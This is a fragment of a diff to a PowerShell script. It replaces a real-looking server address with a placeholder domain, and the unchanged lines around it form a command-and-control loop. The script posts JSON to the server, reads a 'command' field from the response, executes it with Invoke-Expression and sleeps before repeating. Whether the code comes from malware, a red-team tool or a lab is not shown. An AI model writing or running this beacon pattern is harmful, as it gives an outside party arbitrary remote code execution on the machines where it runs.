@@ -17,7 +17,7 @@ $json = @"
 }
 "@
 
-$response = iwr -Uri https://220.ip-54-37-16.eu/ -Method POST -Body $json -UseBasicParsing
+$response = iwr -Uri https://dummy.domain.com/ -Method POST -Body $json -UseBasicParsing
 $command = $response | convertFrom-Json | select -ExpandProperty command 
 if (-Not ($command -eq "" -Or -Not $command -eq $null)){$result = iex $command;echo $result}
 start-sleep 5
